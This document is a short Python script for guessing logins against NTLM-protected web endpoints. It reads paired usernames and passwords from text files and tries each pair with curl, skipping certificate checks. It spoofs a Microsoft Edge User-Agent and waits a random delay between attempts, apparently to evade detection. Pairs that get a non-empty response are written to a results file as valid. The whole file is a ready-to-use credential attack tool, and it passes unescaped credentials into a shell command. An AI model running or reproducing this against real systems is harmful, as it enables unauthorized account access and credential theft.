#!/usr/bin/python
import os
import sys
import time
import random

# Set delay range in milliseconds
min_delay = 100  # Minimum delay in milliseconds
max_delay = 500  # Maximum delay in milliseconds

# Read usernames and passwords from files
users = open("usernames.txt", "r").read().splitlines()
passwords = open("passwords.txt", "r").read().splitlines()

# Define the URL from the command line argument
url = sys.argv[1]
domain = ""

# Define the curl command template with Microsoft desktop User-Agent
user_agent = "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64'"
cmd = f"curl -k --ntlm -A {user_agent} -u "

# Create or clear the output file
with open("results.txt", "w") as output_file:
    output_file.write("Username:Password - Valid\n")
    output_file.write("==========================\n")

# Loop through users and passwords
for i, user in enumerate(users):
    if i < len(passwords):  # Check if a corresponding password exists
        username_password = f"{domain}{user.lower()}:{passwords[i]}"
        print("Attempting: " + username_password)
        
        # Escape the username and password in single quotes to handle special characters
        safe_username_password = f"'{domain}{user.lower()}:{passwords[i]}'"
        
        # Create a temporary output file for each attempt
        os.system(f"{cmd}{safe_username_password} {url} -o temp_output.html")
        
        # Check if the temp_output.html file was created successfully
        if os.path.exists("temp_output.html"):
            file_size = os.path.getsize("temp_output.html")
            
            # Determine if the combination is valid
            if file_size > 0:
                valid = "True"
            else:
                valid = "False"
            
            # Write the result to the output file
            with open("results.txt", "a") as output_file:
                output_file.write(f"{username_password} - {valid}\n")
            
            # Clean up the temporary file
            os.remove("temp_output.html")
        else:
            print(f"Failed to create output file for {username_password}. Skipping.")
        
        # Introduce a random delay between requests
        delay = random.uniform(min_delay, max_delay) / 1000.0  # Convert ms to seconds
        print(f"Waiting for {delay:.3f} seconds before the next attempt...")
        time.sleep(delay)

print("Testing complete. Check 'results.txt' for the output.")
